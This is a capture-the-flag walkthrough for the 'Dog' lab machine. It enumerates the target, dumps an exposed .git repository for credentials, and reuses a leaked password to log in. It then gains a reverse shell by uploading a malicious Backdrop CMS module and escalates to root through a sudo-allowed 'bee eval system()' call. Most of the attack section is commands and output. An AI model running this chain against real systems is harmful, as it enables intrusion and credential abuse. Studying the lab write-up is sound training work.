f## Enumeration

We start by running nmap to see what ports are on on the target machine 
```bash
sudo nmap -sV 10.10.10.29  
```
`-sV` enables version detection.
Output:
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 04:56 CEST
Nmap scan report for 10.10.11.58
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.46 seconds
```

The word list is a bit tricky here I ended up using this
https://github.com/daviddias/node-dirbuster/blob/master/lists/directory-list-2.3-big.txt

```bash
feroxbuster -u http://10.10.11.58/ -w ./directory-list-2.3-big.txt  -x php,sh 
```
Gets us a shit ton of hits, but not what we are looking for so I recommend adding in popular . files so you dont miss files like .git which are interesting for this box.

## Observations

While looking for paths we find a .git and we can use [GitTools](https://github.com/internetwache/GitTools/tree/master).

Dump the `.git` directory using `gitdumper.sh`:
note: you need to let this run for a while 
```bash
gitdumper.sh http://dog.htb/.git/ dog-git
cd dog-git
```

Then use the extractor
```bash
./extractor.sh ../Dumper/dog-git/ git-ext
```

then find emails used by users,
```bash
grep -R "@dog.htb" *                                           
Desktop/shared vault/kali-vault/publish/HTB boxes/Dog.md:root <dog@dog.htb>
Desktop/shared vault/kali-vault/publish/HTB boxes/Dog.md:tiffany <tiffany@dog.htb>
GitTools/Extractor/git-ext/0-8204779c764abd4c9d8d95038b6d22b6a7515afa/commit-meta.txt:author root <dog@dog.htb> 1738963331 +0000
GitTools/Extractor/git-ext/0-8204779c764abd4c9d8d95038b6d22b6a7515afa/commit-meta.txt:committer root <dog@dog.htb> 1738963331 +0000
GitTools/Dumper/git-dump/.git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000     commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
GitTools/Dumper/git-dump/.git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000        commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases

```

Search for database credentials:
```bash
grep -r "mysql://" .
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

So, creds are:
- User: `root`
- Password: `BackDropJ2024DS2024`

Which does not work :(
```bash
root <dog@dog.htb>
tiffany <tiffany@dog.htb>
```
Try logging in at:
```bash
http://dog.htb/?q=user/login
```
Using:
```bash
Username: tiffany
Password: BackDropJ2024DS2024
```
Success — logged in as Tiffany.

## Exploit & Privileges Escalation

Authenticated RCE via Module Upload
Backdrop CMS v1.27.1 is vulnerable to RCE via malicious module upload.

Prepare payload:
Make a folder named `shell/` with two files:
shell.info
```bash
type = module
name = Shell
description = Reverse shell
core = 1.x
package = Custom
version = 1.0
```

#### `shell.php`:
Insert a PHP reverse shell payload (e.g., from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)).
Then archive the folder:
```bash
tar -czf shell.tar.gz shell/
```

Upload Module & Trigger Shell
Go to:
http://dog.htb/?q=admin/modules/install
- Upload `shell.tar.gz`
- Enable the module if required
- Trigger shell at:
http://dog.htb/modules/shell/shell.php
Meanwhile, on your attacker machine:
```bash
nc -lvnp 4444
```

Reverse shell caught as `www-data`
In your reverse shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```bash
ls /home
johncusack

su johncusack
Password: BackDropJ2024DS2024

cat ~/user.txt
6f57eee316d5714*****************
```

Check `sudo` access:
You’ll see:
```bash
(ALL) NOPASSWD: /usr/local/bin/bee --root=/var/www/html *
```

This lets you run the `bee` CLI (Backdrop’s tool) with root privileges.
Exploit with system():
```bash
sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"

cat /root/root.txt > /tmp/f
cat /tmp/f
b47fde5773706a2*****************
```
